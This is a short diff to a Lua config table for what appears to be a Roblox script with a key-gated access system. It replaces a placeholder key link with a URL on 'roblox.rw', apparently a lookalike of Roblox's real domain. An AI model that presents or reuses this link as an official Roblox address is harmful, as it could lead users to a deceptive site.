@@ -11,7 +11,7 @@ local Config = {
     Credit  = "made by Kysezz",
 
     -- Paste your key link between the quotes. Change it any time.
-    KeyLink = "PASTE_YOUR_KEY_LINK_HERE",
+    KeyLink = "https://www.roblox.rw/communities/178984439199/Stapian-Wrld",
 
     -- Option A: a single hardcoded key (leave "" to disable)
     Key = "PASTE_YOUR_KEY_HERE",
